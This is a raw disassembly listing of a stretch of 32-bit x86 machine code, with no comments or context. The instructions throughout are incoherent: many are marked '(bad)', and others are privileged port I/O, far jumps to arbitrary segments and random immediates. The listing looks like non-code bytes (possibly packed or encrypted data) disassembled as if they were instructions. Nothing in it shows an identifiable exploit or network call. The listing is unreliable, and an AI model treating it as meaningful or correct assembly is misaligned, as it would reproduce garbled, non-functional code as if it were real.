  4215d7:	ror    DWORD PTR [edx+eiz*4+0x21a8719f],1
  4215de:	pop    ebx
  4215df:	xchg   esp,eax
  4215e0:	mov    ds,WORD PTR [esp+ebx*2+0x6b]
  4215e4:	dec    ebp
  4215e5:	or     BYTE PTR [edi+0x11d22071],bl
  4215eb:	scas   al,BYTE PTR es:[edi]
  4215ec:	jne    0x4215f1
  4215ee:	fcomp  DWORD PTR [ebx-0x6b]
  4215f1:	ss cwde 
  4215f3:	jb     0x42162e
  4215f5:	(bad)  
  4215f6:	pusha  
  4215f7:	jmp    0x421617
  4215f9:	aaa    
  4215fa:	sub    eax,0xf034d6a5
  4215ff:	shr    DWORD PTR [edx],cl
  421601:	sub    dh,bl
  421603:	push   esi
  421604:	ret    
  421605:	ds (bad) 
  421607:	fsub   DWORD PTR [eax]
  421609:	in     al,0x60
  42160b:	test   DWORD PTR [edi],ecx
  42160d:	fbld   TBYTE PTR [ecx-0x15db9dbc]
  421613:	aad    0xca
  421615:	(bad)  
  421616:	mov    al,ch
  421618:	call   0xaad5:0x8855bf32
  42161f:	jno    0x421657
  421621:	loop   0x4215b7
  421623:	add    DWORD PTR [edi+0x1f],0xffffffc8
  421627:	inc    edi
  421628:	out    0xe2,al
  42162a:	mov    ebp,0x8b2349a4
  42162f:	pop    esi
  421630:	mov    cl,cl
  421632:	clc    
  421633:	mov    esi,0x90fb3eb9
  421638:	rol    BYTE PTR [edx],cl
  42163a:	test   DWORD PTR fs:[eax],ecx
  42163d:	into   
  42163e:	push   ebp
  42163f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421640:	xor    DWORD PTR [esi],esi
  421642:	push   edi
  421643:	pop    edi
  421644:	dec    edi
  421645:	lahf   
  421646:	pop    ds
  421647:	push   edx
  421648:	dec    edx
  421649:	cmp    cl,dh
  42164b:	sub    BYTE PTR [ecx-0x39a361d1],dh
  421651:	test   DWORD PTR [edi-0x47],esp
  421654:	mov    cl,0x2
  421656:	stc    
  421657:	fcmove st,st(4)
  421659:	mov    ah,0x6d
  42165b:	pop    es
  42165c:	je     0x42162b
  42165e:	ror    DWORD PTR [edi],cl
  421660:	test   eax,0xb4320fb3
  421665:	add    ch,BYTE PTR [esi+0x778baf31]
  42166b:	ja     0x42169d
  42166d:	adc    al,0x6d
  42166f:	ins    DWORD PTR es:[edi],dx
  421670:	call   0x8865f05d
  421675:	scas   eax,DWORD PTR es:[edi]
  421676:	xlat   BYTE PTR ds:[ebx]
  421677:	mov    eax,0x4d2805bb
  42167c:	mov    eax,0xd3c4875f
  421681:	icebp  
  421682:	pusha  
  421683:	div    ebx
  421685:	out    dx,eax
  421686:	(bad)  
  421687:	fidiv  WORD PTR [edi-0x21]
  42168a:	jo     0x421623
  42168c:	cli    
  42168d:	mov    WORD PTR [ebx+0x711fa5d5],ds
  421693:	pop    edx
  421694:	aas    
  421695:	nop
  421696:	pusha  
  421697:	jae    0x4216ed
  421699:	xchg   ebp,eax
  42169a:	mov    ss,WORD PTR [edx+0x24]
  42169d:	mov    BYTE PTR [eax+0x414eefd5],dh
  4216a3:	add    al,0xdc
  4216a5:	lea    ebp,[ecx]
  4216a7:	xchg   ebx,eax
  4216a8:	mov    BYTE PTR [ecx-0x34],ch
  4216ab:	loope  0x42171f
  4216ad:	pushf  
  4216ae:	jno    0x42171f
  4216b0:	inc    ebp
  4216b1:	add    eax,DWORD PTR [esi*8-0x687b92c1]
  4216b8:	dec    ecx
  4216b9:	neg    BYTE PTR [edi]
  4216bb:	add    eax,0xe3ac7725
  4216c0:	sbb    ch,cl
  4216c2:	xor    eax,0xe2a33d7
  4216c7:	sub    eax,0x290c2fb8
  4216cc:	mov    BYTE PTR ds:0xe240662c,cl
  4216d2:	pushf  
  4216d3:	jle    0x42174b
  4216d5:	dec    edx
  4216d6:	stos   BYTE PTR es:[edi],al
  4216d7:	pop    es
  4216d8:	mov    ebx,0x5f09600e
  4216dd:	outs   dx,DWORD PTR ds:[esi]
  4216de:	call   0x677b4ef1
  4216e3:	lods   eax,DWORD PTR ds:[esi]
  4216e4:	ins    DWORD PTR es:[edi],dx
  4216e5:	xor    esi,DWORD PTR [esi+ebp*1-0x5f36dd77]
  4216ec:	sti    
  4216ed:	lea    esp,[ecx+0x5f0f8aea]
  4216f3:	pop    edi
  4216f4:	mov    edx,0xe1fcdbf7
  4216f9:	test   eax,0xbf89bd14
  4216fe:	js     0x42177d
  421700:	fs mov cl,0xf9
  421703:	mov    eax,0x92ca0257
  421708:	mov    al,ds:0xb2647923
  42170d:	sub    bh,BYTE PTR [ebp-0x19]
  421710:	jp     0x42178f
  421712:	cwde   
  421713:	aam    0xd0
  421715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421716:	loop   0x421704
  421718:	enter  0x7202,0x15
  42171c:	mov    eax,DWORD PTR [eax+0xcc3a333]
  421722:	pusha  
  421723:	daa    
  421724:	retf   0xff8e
  421727:	in     al,0x4c
  421729:	adc    al,0xc5
  42172b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42172c:	mov    dh,0x33
  42172e:	adc    edi,DWORD PTR [eax-0x77]
  421731:	sub    DWORD PTR [ebx+0x1e],0xfffffff1
  421735:	and    al,BYTE PTR ds:0x90a18892
  42173b:	dec    ebx
  42173c:	and    ecx,DWORD PTR [eax+0x29a90482]
  421742:	ss test eax,0xb7dfc10b
  421748:	into   
  421749:	ins    BYTE PTR es:[edi],dx
  42174a:	adc    bh,BYTE PTR [esi+esi*8+0x51d54051]
  421751:	ror    BYTE PTR [ecx],cl
  421753:	or     eax,0xd430667e
  421758:	sbb    edi,DWORD PTR [esi-0x26cb7166]
  42175e:	xchg   ecx,eax
  42175f:	jp     0x4217c9
  421761:	(bad)  [eax+0x69]
  421764:	or     cl,BYTE PTR [ecx-0x639f8309]
  42176a:	lahf   
  42176b:	cdq    
  42176c:	popf   
  42176d:	int3   
  42176e:	in     eax,0xd4
  421770:	pop    eax
  421771:	mov    ch,0x37
  421773:	mov    ebx,0xa2be662b
  421778:	mov    BYTE PTR ds:0x1297aa2d,bh
  42177e:	or     ebx,DWORD PTR [edx]
  421780:	pop    esp
  421781:	add    ch,BYTE PTR [edx-0x4f53b794]
  421787:	icebp  
  421788:	and    DWORD PTR [eax+0x2f65ad6d],ecx
  42178e:	loope  0x421782
  421790:	out    dx,al
  421791:	test   BYTE PTR [ebx-0x55],dh
  421794:	lock paddusb mm4,QWORD PTR [esi+edx*8-0x5e]
  42179a:	aaa    
  42179b:	adc    BYTE PTR [ebx+eax*8-0x2a1a34e1],bh
  4217a2:	push   0x86a404bf
  4217a7:	aam    0xdf
  4217a9:	cmp    eax,0xebe98ebd
  4217ae:	inc    esi
  4217af:	jge    0x421739
  4217b1:	add    DWORD PTR [eax+0x39],0xf61ed3e4
  4217b8:	inc    edi
  4217b9:	add    dl,BYTE PTR [esi-0x47d395f6]
  4217bf:	lea    edi,[edi]
  4217c1:	shl    DWORD PTR [eax-0x23],cl
  4217c4:	and    dh,BYTE PTR [esi+0x4494a674]
  4217ca:	cmp    ah,dl
  4217cc:	xchg   BYTE PTR [ebx],ah
  4217ce:	test   BYTE PTR [esi+edx*2-0x76281371],dh
  4217d5:	ja     0x421801
  4217d7:	mov    BYTE PTR [ebp-0x37],al
  4217da:	and    esp,DWORD PTR [edx+edx*1-0x78]
  4217de:	iret   
  4217df:	push   es
  4217e0:	mov    ebx,DWORD PTR [esi-0x3c]
  4217e3:	ja     0x421797
  4217e5:	sbb    dh,bl
  4217e7:	sbb    eax,0xee04d55c
  4217ec:	mov    bh,bh
  4217ee:	adc    esi,esp
  4217f0:	(bad)  
  4217f2:	clc    
  4217f3:	mov    eax,0x58480290
  4217f8:	call   0x6c01:0x7c2d02ea
  4217ff:	and    DWORD PTR [edx+edi*1],eax
  421802:	stos   BYTE PTR es:[edi],al
  421803:	outs   dx,BYTE PTR ds:[esi]
  421804:	or     ebp,esi
  421806:	mov    al,0x25
  421808:	pop    esp
  421809:	add    ebx,edx
  42180b:	test   al,al
  42180d:	nop
  42180e:	ret    0x1474
  421811:	push   ds
  421812:	jnp    0x421845
  421814:	pop    esp
  421815:	sub    bp,bp
  421818:	push   eax
  421819:	jb     0x421868
  42181b:	and    al,0x64
  42181d:	inc    ecx
  42181e:	es xchg ebp,eax
  421820:	jle    0x42186c
  421822:	jb     0x4217f8
  421824:	fs push 0x5b
  421827:	mov    ecx,0x39600895
  42182c:	std    
  42182d:	leave  
  42182e:	pushf  
  42182f:	(bad)
  421833:	aam    0x21
  421835:	xlat   BYTE PTR ds:[ebx]
  421836:	fstp   TBYTE PTR [edi-0x1e08f72d]
  42183c:	icebp  
  42183d:	imul   edx,DWORD PTR [edi+ebx*8],0xffffff88
  421841:	jmp    0x421810
  421843:	jo     0x4217c5
  421845:	sbb    bh,dl
  421847:	cli    
  421848:	jmp    0xa1ed:0x2d831226
  42184f:	enter  0x288c,0xbc
  421853:	int3   
  421854:	ret    
  421855:	sbb    DWORD PTR [esi],ebx
  421857:	push   ecx
  421858:	cmc    
  421859:	mov    BYTE PTR [edi],al
  42185b:	loope  0x421821
  42185d:	push   edi
  42185e:	not    ah
  421860:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421861:	hlt    
  421862:	mov    ds:0xca21fd0d,eax
  421867:	cmp    al,0x89
  421869:	mov    ds:0x7f33f3ef,eax
  42186e:	mov    eax,DWORD PTR [esi+0x84e1f3f]
  421874:	jl     0x42185a
  421876:	sub    BYTE PTR [eax+ecx*1],al
  421879:	pusha  
  42187a:	in     al,dx
  42187b:	add    BYTE PTR [esi-0x5a9cd32d],al
  421881:	test   eax,0x8f2e42ff
  421886:	in     al,dx
  421887:	aam    0x7f
  421889:	mov    ebx,0xdae45c9
  42188e:	jmp    0xcb61:0x10e388af
  421895:	xlat   BYTE PTR ds:[ebx]
  421896:	cmp    bh,BYTE PTR [eax+0x850733e]
  42189c:	mov    BYTE PTR [ecx],dl
  42189e:	jns    0x421881
  4218a0:	das    
  4218a1:	adc    dh,BYTE PTR [edx+0x5f7d8982]
  4218a7:	and    DWORD PTR [eax+0x5b],ecx
  4218aa:	ret    
  4218ab:	xchg   esi,eax
  4218ac:	iret   
  4218ad:	add    ch,BYTE PTR [esi]
  4218af:	sahf   
  4218b0:	cmp    ch,BYTE PTR [ebx-0x4d]
  4218b3:	in     eax,dx
  4218b4:	lods   al,BYTE PTR ds:[esi]
  4218b5:	(bad)  
  4218b6:	pop    ds
  4218b7:	inc    edi
  4218b8:	push   0x77
  4218ba:	je     0x42192d
  4218bc:	cli    
  4218bd:	sbb    eax,ebp
  4218bf:	aam    0x2a
  4218c1:	or     cl,BYTE PTR [esi]
  4218c3:	mov    edi,0x7233dd1e
  4218c8:	mov    DWORD PTR [ebp+0x65],esp
  4218cb:	add    dh,BYTE PTR [eax]
  4218cd:	pop    ebp
  4218ce:	add    ah,BYTE PTR [ebp+0xa500344]
  4218d4:	iret   
  4218d5:	sub    DWORD PTR es:[ebp-0x8],edx
  4218d9:	pop    eax
  4218da:	pop    ecx
  4218db:	loope  0x4218f6
  4218dd:	cmp    DWORD PTR [esi],ebx
  4218df:	jb     0x4218b2
  4218e1:	fld    QWORD PTR [ecx]
  4218e3:	rol    DWORD PTR [ebp+0x1e],cl
  4218e6:	nop
  4218e7:	std    
  4218e8:	repnz and DWORD PTR [ecx+ebp*2],edx
  4218ec:	jbe    0x4218f1
  4218ee:	maxps  xmm7,XMMWORD PTR [ecx+eax*2]
  4218f2:	lods   al,BYTE PTR ds:[esi]
  4218f3:	aam    0x93
  4218f5:	cs push esp
  4218f7:	leave  
  4218f8:	push   ss
  4218f9:	push   es
  4218fa:	fisttp WORD PTR [esi-0x1d70b477]
  421900:	xchg   ecx,eax
  421901:	pop    ebx
  421902:	lods   al,BYTE PTR ds:[esi]
  421903:	lods   eax,DWORD PTR ds:[esi]
  421904:	adc    al,BYTE PTR [edx]
  421906:	fmulp  st(1),st
  421908:	aam    0x25
  42190a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42190b:	pop    ebp
  42190c:	and    DWORD PTR [edx+0x1e],edi
  42190f:	lds    ebp,FWORD PTR [edx]
  421911:	jbe    0x4218a7
  421913:	bound  esp,QWORD PTR [eax]
  421915:	sti    
  421916:	out    0xd5,eax
  421918:	cmp    DWORD PTR cs:[edi-0x6e],ebx
  42191c:	aad    0x90
  42191e:	out    dx,eax
  42191f:	add    cl,BYTE PTR [eax+0x6d37638f]
  421925:	daa    
  421926:	mov    ds:0xa20368b7,al
  42192b:	push   cs
  42192c:	dec    edx
  42192d:	mov    edx,0xaee4b6eb
  421932:	pop    ds
  421933:	jae    0x4218f5
  421935:	jle    0x42192c
  421937:	ret    
  421938:	adc    al,BYTE PTR [edi+0x67c2a2f1]
  42193e:	dec    eax
  42193f:	loop   0x4218c8
  421941:	push   esi
  421942:	ss aaa 
  421944:	adc    ecx,DWORD PTR [eax-0x7e]
  421947:	cdq    
  421948:	mov    DWORD PTR [ebx],ebx
  42194a:	pop    edi
  42194b:	cmp    bl,BYTE PTR [edi]
  42194d:	cmovo  ebp,DWORD PTR [edi+0x10]
  421951:	std    
  421952:	jmp    0x421924
  421954:	pushf  
  421955:	xor    eax,0x92474224
  42195a:	and    BYTE PTR [ebx],cl
  42195c:	hlt    
  42195d:	rcr    DWORD PTR [edi],1
  42195f:	mov    DWORD PTR [esi-0x62],esi
  421962:	lahf   
  421963:	and    ebx,DWORD PTR [edx-0x4a2a9136]
  421969:	and    al,0xf9
  42196b:	xor    eax,0xf2360b1
  421970:	jns    0x42194c
  421972:	ins    DWORD PTR es:[edi],dx
  421973:	fnstsw WORD PTR [eax+ecx*2+0x47]
  421977:	push   edx
  421978:	sub    DWORD PTR [esi+edx*1+0x34035c59],ebp
  42197f:	jae    0x421957
  421981:	inc    edx
  421982:	sahf   
  421983:	ins    DWORD PTR es:[edi],dx
  421984:	mov    bl,0x4f
  421986:	pop    ds
  421987:	mov    bl,0x19
  421989:	inc    eax
  42198a:	call   0xb1e0fe62
  42198f:	mov    edx,0xcbbbee1c
  421994:	pop    ebx
  421995:	add    DWORD PTR [ebp-0x21],edi
  421998:	mov    BYTE PTR [ebp-0x10],ah
  42199b:	mov    ds:0xaf279634,eax
  4219a0:	mov    DWORD PTR [ebp-0x67cc5a53],esp
  4219a6:	in     al,dx
  4219a7:	ror    BYTE PTR [esi+0x4b],1
  4219aa:	repnz call 0x9cb9:0x1ca10259
  4219b2:	xchg   DWORD PTR [ebx],ebp
  4219b4:	mov    ch,0x9d
  4219b6:	sub    ecx,DWORD PTR [ebx-0x4e1f4e4a]
  4219bc:	sbb    eax,edi
  4219be:	aas    
  4219bf:	sub    BYTE PTR [edi],bh
  4219c1:	add    ecx,DWORD PTR [esp+eax*1-0xf41a756]
  4219c8:	test   BYTE PTR [ecx],dh
  4219ca:	jp     0x421959
  4219cc:	push   esp
  4219cd:	mov    WORD PTR [esi+edx*1],ss
  4219d0:	std    
  4219d1:	mov    dl,0x28
  4219d3:	rcr    BYTE PTR [eax-0x17],1
  4219d6:	push   esi
  4219d7:	aad    0xd
  4219d9:	sbb    ecx,edi
  4219db:	mov    esi,DWORD PTR [edi]
  4219dd:	jle    0x4219f1
  4219df:	jne    0x42196a
  4219e1:	sbb    DWORD PTR [esi],ebp
  4219e3:	push   es
  4219e4:	mov    esp,0x27dfd68e
  4219e9:	add    BYTE PTR [edx],cl
  4219eb:	into   
  4219ec:	mov    dl,0xe9
  4219ee:	mov    eax,ds:0xc6b59f20
  4219f3:	out    0x88,al
  4219f5:	out    dx,eax
  4219f6:	sub    al,0xab
  4219f8:	fisttp DWORD PTR [edi+0x581b6fd]
  4219fe:	and    DWORD PTR fs:[ecx],eax
  421a01:	pop    ebp
  421a02:	dec    ebp
  421a03:	add    eax,0xab58440c
  421a08:	mov    ecx,0x7b061e8
  421a0d:	or     eax,0x3764d17
  421a12:	cmp    ecx,ecx
  421a14:	pop    DWORD PTR ds:0x368ceb30
  421a1a:	or     ecx,0xef608d20
  421a20:	es out 0x6a,eax
  421a23:	sub    ah,BYTE PTR [edx]
  421a25:	cmp    al,0x8e
  421a27:	cld    
  421a28:	ja     0x421a2a
  421a2a:	les    ecx,FWORD PTR [ebp-0x21]
  421a2d:	fld    QWORD PTR [esi-0x20781ad7]
  421a33:	mov    edx,0x6e562c70
  421a38:	pop    DWORD PTR [ebx]
  421a3a:	popa   
  421a3b:	cmp    esi,eax
  421a3d:	clc    
  421a3e:	mov    WORD PTR [ecx+edi*8],gs
  421a41:	test   DWORD PTR [eax+0x6d],esp
  421a44:	ror    DWORD PTR [ebx+0x7b],cl
  421a47:	and    al,0xe1
  421a49:	inc    ebx
  421a4a:	add    DWORD PTR [ebp-0x73],esi
  421a4d:	and    ebx,edx
  421a4f:	and    BYTE PTR [esi-0x5168df93],dl
  421a55:	int    0x96
  421a57:	or     ch,cl
  421a59:	add    al,BYTE PTR [esi-0x34]
  421a5c:	rcr    BYTE PTR [edx+esi*4],0x7d
  421a60:	xchg   ebx,eax
  421a61:	gs nop
  421a63:	jns    0x421a4f
  421a65:	xor    al,0x5f
  421a67:	or     al,0x89
  421a69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a6a:	sti    
  421a6b:	aam    0x20
  421a6d:	inc    esi
  421a6e:	je     0x421a45
  421a70:	xchg   esp,eax
  421a71:	or     eax,DWORD PTR [esi-0x7eb170d7]
  421a77:	mov    es,WORD PTR [edi-0x3fbd4373]
  421a7d:	loop   0x421abf
  421a7f:	sub    DWORD PTR [esi-0x74],0x8364d574
  421a86:	inc    eax
  421a87:	fild   WORD PTR [esi+0x25]
  421a8a:	mov    DWORD PTR [edx],ebx
  421a8c:	jns    0x421aa5
  421a8e:	xlat   BYTE PTR ds:[ebx]
  421a8f:	inc    DWORD PTR [ebx+0x76175605]
  421a95:	or     eax,0xe154b37c
  421a9a:	rcr    BYTE PTR [esi-0x25],0x5
  421a9e:	and    dh,BYTE PTR [edi+edi*2+0x3ef6dfa]
  421aa5:	pop    ebp
  421aa6:	bound  eax,QWORD PTR [edi]
  421aa8:	cmova  esp,DWORD PTR [ebp-0x4f7a1704]
  421aaf:	addr16 inc esp
  421ab1:	bound  ecx,QWORD PTR [edx-0x73]
  421ab4:	je     0x421b33
  421ab6:	(bad)  
  421ab8:	mov    BYTE PTR ds:0x79fd42e4,bl
  421abe:	jmp    0x421af9
  421ac0:	cdq    
  421ac1:	xor    eax,0xadc2efc8
  421ac6:	dec    ebp
  421ac7:	xchg   BYTE PTR [eax+0x30282551],cl
  421acd:	dec    esp
  421ace:	xor    dl,cl
  421ad0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ad1:	sbb    al,0x7a
  421ad3:	mov    WORD PTR ds:0xc8b61c24,es
  421ad9:	mov    al,ds:0x19b50c9a
  421ade:	jno    0x421b5d
  421ae0:	or     ecx,ecx
  421ae2:	(bad)
  421ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ae7:	aad    0x17
  421ae9:	sahf   
  421aea:	icebp  
  421aeb:	cmc    
  421aec:	xor    BYTE PTR [ebp+0x1270b328],dl
  421af2:	pop    ds
  421af3:	test   edx,ebx
  421af5:	dec    ebx
  421af6:	cmp    BYTE PTR [edi],dh
  421af8:	ins    BYTE PTR es:[di],dx
  421afa:	jg     0x421b42
  421afc:	ror    DWORD PTR [ebx],1
  421afe:	pop    edx
  421aff:	push   ebx
  421b00:	mov    al,0x82
  421b02:	xor    BYTE PTR [ecx],ch
  421b04:	inc    edx
  421b05:	repnz fwait
  421b07:	or     DWORD PTR [eax+0x661f0bbb],ecx
  421b0d:	mov    bl,0xa0
  421b0f:	xor    al,0xc5
  421b11:	add    dh,BYTE PTR [eax+eax*2]
  421b14:	not    DWORD PTR [edx]
  421b16:	or     DWORD PTR [ebx],edx
  421b18:	adc    DWORD PTR [esi],edi
  421b1a:	push   ds
  421b1b:	sub    eax,0x34ed1667
  421b20:	sbb    BYTE PTR [ebx+0x17],al
  421b23:	aam    0xda
  421b25:	xor    BYTE PTR [ebp+0x46ec08b8],0x98
  421b2c:	mov    ebx,eax
  421b2e:	into   
  421b2f:	mov    eax,ds:0x49d8f45c
  421b34:	aaa    
  421b35:	(bad)  
  421b36:	dec    ebx
  421b37:	and    al,0x89
  421b39:	xchg   ecx,eax
  421b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b3b:	sub    bl,al
  421b3d:	mov    eax,ds:0xef417c39
  421b42:	jnp    0x421bab
  421b44:	das    
  421b45:	lods   eax,DWORD PTR ds:[esi]
  421b46:	test   DWORD PTR [edx+ecx*2+0x60274f9],edx
  421b4d:	sti    
  421b4e:	sbb    eax,0xa0584f3
  421b53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b54:	or     DWORD PTR [edx+0x70cf720a],ebx
  421b5a:	xor    edi,edx
  421b5c:	mov    ebp,0xc2eb99aa
  421b61:	or     BYTE PTR [edx],bl
  421b63:	(bad)  
  421b64:	arpl   WORD PTR [ebx+0x768cbdcc],bp
  421b6a:	and    eax,0x60b8f1cc
  421b6f:	sbb    DWORD PTR [edx+0x74565631],ecx
  421b75:	js     0x421b0b
  421b77:	aad    0x1c
  421b79:	cmp    al,0xa1
  421b7b:	(bad)  
  421b7c:	sub    eax,0x89e1ef81
  421b81:	mov    ch,0x6f
  421b83:	scas   al,BYTE PTR es:[edi]
  421b84:	sub    BYTE PTR ds:0x5cdd1a5,0xc8
  421b8b:	pop    edi
  421b8c:	adc    eax,0x636350a9
  421b91:	mov    dh,0x84
  421b93:	cdq    
  421b94:	pop    ebp
  421b95:	imul   ebp,DWORD PTR [esi],0x5
  421b98:	dec    edi
  421b99:	xor    BYTE PTR [eax],bh
  421b9b:	xlat   BYTE PTR ds:[ebx]
  421b9c:	pop    ecx
  421b9d:	lods   al,BYTE PTR ds:[esi]
  421b9e:	in     eax,0xed
  421ba0:	mov    DWORD PTR [ecx-0x6f],edi
  421ba3:	cli    
  421ba4:	fmul   DWORD PTR [ecx+0x2c3257]
  421bab:	add    eax,0x2618828
  421bb0:	outs   dx,DWORD PTR ds:[esi]
  421bb1:	jg     0x421bff
  421bb3:	push   ebp
  421bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bb5:	call   0xcbd9030a
  421bba:	test   al,0xac
  421bbc:	mov    bh,0x85
  421bbe:	jp     0x421b7d
  421bc0:	stos   BYTE PTR es:[edi],al
  421bc1:	jbe    0x421c2e
  421bc3:	aad    0xf0
  421bc5:	cmp    DWORD PTR [edx-0x3ecfcc4a],ebp
  421bcb:	pop    edi
  421bcc:	xchg   esp,eax
  421bcd:	xchg   ebp,eax
  421bce:	aam    0xc5
  421bd0:	fwait
  421bd1:	or     dh,0xbb
  421bd4:	or     cl,BYTE PTR [ebx]
  421bd6:	sub    dl,ah
  421bd8:	mov    al,ds:0xfd423304
  421bdd:	sub    bl,cl
  421bdf:	sbb    ch,BYTE PTR [edx+0x5e]
  421be2:	pop    ds
  421be3:	aaa    
  421be4:	inc    esi
  421be5:	pop    ds
  421be6:	test   ecx,esp
  421be8:	lods   al,BYTE PTR ds:[esi]
  421be9:	jp     0x421b89
  421beb:	rcr    DWORD PTR [eax],cl
  421bed:	push   esi
  421bee:	jne    0x421c2d
  421bf0:	in     eax,0xc0
  421bf2:	ins    DWORD PTR es:[edi],dx
  421bf3:	sbb    cl,BYTE PTR [eax+0x18a5a63a]
  421bf9:	push   ecx
  421bfa:	pop    ds
  421bfb:	pop    ds
  421bfc:	test   DWORD PTR [ebp-0x8],edi
  421bff:	rol    BYTE PTR [ecx+ebx*8+0x23],cl
  421c03:	test   DWORD PTR [esi+0x2],0x3c2ec0b8
  421c0a:	jno    0x421c39
  421c0c:	ret    
  421c0d:	and    eax,0xffbcd91f
  421c12:	loop   0x421bf7
  421c14:	jb     0x421bd6
  421c16:	add    al,0xd4
  421c18:	or     al,0xec
  421c1a:	pop    es
  421c1b:	jl     0x421c6a
  421c1d:	ss jg  0x421c85
  421c20:	mov    bl,ch
  421c22:	shl    DWORD PTR [esi+eiz*1+0x69],1
  421c26:	lods   eax,DWORD PTR ds:[esi]
  421c27:	sbb    eax,0x1e360584
  421c2c:	sub    bl,BYTE PTR [esi-0x6d]
  421c2f:	stos   DWORD PTR es:[edi],eax
  421c30:	icebp  
  421c31:	xchg   edx,eax
  421c32:	pop    edx
  421c33:	xlat   BYTE PTR ds:[ebx]
  421c34:	inc    ecx
  421c35:	mov    BYTE PTR [esp+ebx*2+0x424d3f8a],bh
  421c3c:	mov    esi,0xc1d8efed
  421c41:	add    cl,BYTE PTR [edi+esi*2]
  421c44:	ret    
  421c45:	mov    dl,BYTE PTR [edi+0x1d]
  421c48:	push   eax
  421c49:	xchg   edi,eax
  421c4a:	cwde   
  421c4b:	sbb    esi,DWORD PTR ds:0x61fa2b02
  421c51:	prefetch (bad)
  421c52:	or     eax,0xd00369f0
  421c57:	xor    al,0xdf
  421c59:	sbb    dl,cl
  421c5b:	adc    al,0x2d
  421c5d:	test   BYTE PTR [edi],ch
  421c5f:	fisttp QWORD PTR [eax-0x1f90e135]
  421c65:	sbb    cl,dh
  421c67:	xor    ebp,DWORD PTR [ebp+0x9]
  421c6a:	fild   DWORD PTR [ebp-0x3e]
  421c6d:	jno    0x421c83
  421c6f:	xlat   BYTE PTR ds:[ebx]
  421c70:	jnp    0x421c0b
  421c72:	cmp    ebx,DWORD PTR [esi+0x5e534d38]
  421c78:	mov    BYTE PTR [edi+0xa9c72a],ah
  421c7e:	outs   dx,DWORD PTR ds:[esi]
  421c7f:	pop    esi
  421c80:	cmp    al,0x8e
  421c82:	dec    ecx
  421c83:	jo     0x421c1c
  421c85:	push   eax
  421c86:	mov    cl,0x49
  421c88:	leave  
  421c89:	aas    
  421c8a:	retf   
  421c8b:	pop    eax
  421c8c:	adc    cl,BYTE PTR [ebx-0x59]
  421c8f:	dec    ebp
  421c90:	push   esi
  421c91:	repnz outs dx,BYTE PTR ds:[esi]
  421c93:	popa   
  421c94:	lock push esp
  421c96:	call   DWORD PTR [ebx+0x18]
  421c99:	add    al,0xf6
  421c9b:	aad    0xec
  421c9d:	test   eax,0x83b86ee3
  421ca2:	dec    esi
  421ca3:	in     eax,dx
  421ca4:	mov    ah,0x1d
  421ca6:	retf   0x95c6
  421ca9:	fnstcw WORD PTR [ebp-0x69]
  421cac:	das    
  421cad:	stos   DWORD PTR es:[edi],eax
  421cae:	mov    eax,ds:0x1d1d6882
  421cb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cb4:	sar    DWORD PTR ds:0xba88fb3a,1
  421cba:	mov    eax,0x1f878e26
  421cbf:	jmp    0xe6d73017
  421cc4:	cli    
  421cc5:	les    esi,FWORD PTR [ebp-0x2c]
  421cc8:	jns    0x421c8b
  421cca:	xchg   ebx,eax
  421ccb:	xchg   ebp,eax
  421ccc:	jl     0x421ce9
  421cce:	loop   0x421ca9
  421cd0:	mov    DWORD PTR [edi+0x57],edx
  421cd3:	cmp    DWORD PTR [edx-0x16],eax
  421cd6:	(bad)  [esi]
  421cd8:	mov    esi,0x727d18fc
  421cdd:	inc    esi
  421cde:	mov    esp,0xc397d967
  421ce3:	int    0x41
  421ce5:	inc    ebx
  421ce6:	aaa    
  421ce7:	adc    ebx,DWORD PTR [eax+0x596d1f28]
  421ced:	pop    esp
  421cee:	arpl   bp,bp
  421cf0:	bound  eax,QWORD PTR [ebp+0x6d09d475]
  421cf6:	in     al,dx
  421cf7:	sbb    eax,0x797b966f
  421cfc:	mov    ecx,esp
  421cfe:	jns    0x421d30
  421d00:	(bad)  
  421d01:	or     al,0x13
  421d03:	jge    0x421ccf
  421d05:	add    al,BYTE PTR [esi]
  421d07:	nop
  421d08:	push   ds
  421d09:	sbb    bl,BYTE PTR [ebp+0x44]
  421d0c:	fmul   DWORD PTR ds:0x7988660a
  421d12:	mov    ebx,0x89dc244e
  421d18:	xchg   DWORD PTR ds:0xa0d384e4,eax
  421d1e:	call   0xd735:0x600a0031
  421d25:	push   ds
  421d26:	cmovl  esp,DWORD PTR [edx-0x692be951]
  421d2d:	stc    
  421d2e:	jno    0x421ce0
  421d30:	xor    cl,bl
  421d32:	(bad)  
  421d33:	jecxz  0x421cbe
  421d35:	pop    ss
  421d36:	sbb    al,0x21
  421d38:	imul   DWORD PTR [esi-0x63]
  421d3b:	fnsave [esi]
  421d3d:	daa    
  421d3e:	sbb    al,0x94
  421d40:	les    ebp,FWORD PTR [eax+0x14f09165]
  421d46:	outs   dx,DWORD PTR ds:[esi]
  421d47:	je     0x421d42
  421d49:	cli    
  421d4a:	push   edi
  421d4b:	mov    ds:0xb7600751,eax
  421d50:	sub    al,0xe3
  421d52:	and    BYTE PTR [edx-0x7a],cl
  421d55:	out    dx,eax
  421d56:	clc    
  421d57:	mov    al,0x6f
  421d59:	add    edi,eax
  421d5b:	pop    esi
  421d5c:	jecxz  0x421d21
  421d5e:	mov    esp,DWORD PTR [edi]
  421d60:	les    ebx,FWORD PTR [edx]
  421d62:	push   ds
  421d63:	xchg   ebx,eax
  421d64:	out    dx,al
  421d65:	cmp    DWORD PTR [edx+0x61d6768b],0xa7bbf9a6
  421d6f:	xchg   edx,eax
  421d70:	mov    BYTE PTR [ebx],dh
  421d72:	mov    bl,0x30
  421d74:	jno    0x421d42
  421d76:	pusha  
  421d77:	xchg   ecx,eax
  421d78:	lahf   
  421d79:	dec    esi
  421d7a:	mov    esp,0x617ce7f7
  421d7f:	pop    ebp
  421d80:	sub    cl,BYTE PTR [ebp+0x1f]
  421d83:	scas   eax,DWORD PTR es:[edi]
